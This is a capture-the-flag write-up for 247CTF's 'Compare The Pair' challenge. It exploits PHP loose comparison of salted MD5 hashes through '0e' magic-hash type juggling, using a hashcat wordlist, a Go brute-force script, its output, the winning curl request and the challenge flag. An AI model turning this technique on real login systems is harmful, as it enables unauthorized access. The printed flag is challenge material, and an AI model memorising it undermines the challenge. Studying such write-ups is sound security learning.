# php-juggling-brute-force
247ctf.com's web challenge - Compare The Pair - PHP Juggling challenge
`Description: 
Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?`

```php
247CTF{76fbce3909b3129536bb396fea3a9879} 
<?php  
require_once('flag.php');  
$password_hash = "0e902564435691274142490923013038";  
$salt = "f789bbc328a3d1a3";  
if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){  
echo $flag;  
}  
echo highlight_file(__FILE__, true);  
?>
```

First thing I did is to create a `pass.txt` file that has compensation of 7 length charachters.

```bash
yas3r@linux:~/Desktop/hashcat-5.1.0$ ./hashcat64.bin -a 3 -m 0 -1 ?l -2 ?d --stdout 1?1?1?1?1?1?l > ~/Desktop/pass.txt
```
So the main thing to do is to create a string of `salt` and the `password` and then compare them to the stored password.
It is obvious there a php juggling vuln `$var1 == $var2`

### GoLang 

```go
package  main
import  (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"regexp"
	"time"
)

var  (
	salt string  =  "f789bbc328a3d1a3"
	path string  =  "./pass.txt"
)

func  main()  {
	readLine(path)
}

func  readLine(path string)  {
	inFile, err := os.Open(path)
		if err !=  nil  {
		fmt.Println(err.Error()  +  `: `  + path)
		return
	}
	defer inFile.Close()
	scanner := bufio.NewScanner(inFile)
		for scanner.Scan()  {
			pass := scanner.Text()  // the line
			word := fmt.Sprintf("%s%s", salt, pass)
			hashed :=  GetMD5Hash(word)
			fmt.Printf("[+] %s: %s\n", word, hashed)
			match, _ := regexp.MatchString("^0e[0-9]{30}", hashed)
			if match {
				fmt.Printf("[+] Found it: %s", pass)
				break
			}
		}
}

  
func  GetMD5Hash(text string)  string  {
	hash := md5.Sum([]byte(text))
	return hex.EncodeToString(hash[:])
}
```


### Result
```bash
yas3r@linux[$]$ go run main.go
			*** DELETED ***
[+] f789bbc328a3d1a31ixwlci: 145d5331c3c49e2cbaf7bdc3331af43a
[+] f789bbc328a3d1a31ewwlci: fbc57cbce4ecca92b6699377d9925f4b
[+] f789bbc328a3d1a31ogwlci: 1884259583936c1a8c257f9ee4cc093e
[+] f789bbc328a3d1a31vtwlci: eb3a79bee6067015dcf12fecbdfe0654
[+] f789bbc328a3d1a31yiwlci: 17ed4e0a013bb819a7c7063aea818feb
[+] f789bbc328a3d1a31zwwlci: b6d172ec57df55799d8ac93623667aa7
[+] f789bbc328a3d1a31uywlci: 36ad482077a739131d051fa9ad7eaba4
[+] f789bbc328a3d1a31xkwlci: 0e398583359856907339487099436498
[+] Found it: 1xkwlci  
```

### Flag
`curl https://d25fcfd9f18adc53.247ctf.com/?password=1xkwlci`

```php
247CTF{76fbce3909b3129536bb396fea3a9879} 
<?php  
	require_once('flag.php');  
	$password_hash = "0e902564435691274142490923013038";  
	$salt = "f789bbc328a3d1a3";  
	if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){  
	echo $flag;  
	}  
	echo highlight_file(__FILE__, true);  
?>
```

